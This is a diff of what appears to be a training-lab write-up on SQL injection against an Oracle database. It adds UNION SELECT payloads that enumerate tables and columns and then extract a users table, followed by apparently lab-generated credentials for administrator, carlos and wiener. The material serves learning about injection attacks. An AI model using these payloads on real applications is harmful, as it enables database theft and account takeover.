@@ -21,4 +21,23 @@ Analysis:
 
 3) Output the list of tables in the database
 
-' UNION SELECT table_name, NULL FROM all_tables
+' UNION SELECT table_name, NULL FROM all_tables --
+
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_SQBVDL' --
+
+
+
+USERNAME_STTMKV
+PASSWORD_RGKRIS
+
+
+' UNION SELECT USERNAME_STTMKV,PASSWORD_RGKRIS FROM USERS_SQBVDL --
+
+
+administrator
+cz8adhgki9xbj465g24q
+carlos
+e2pdtoc250mp9vf1f1tr
+wiener
+xlj9y4x9auc38lnkocea
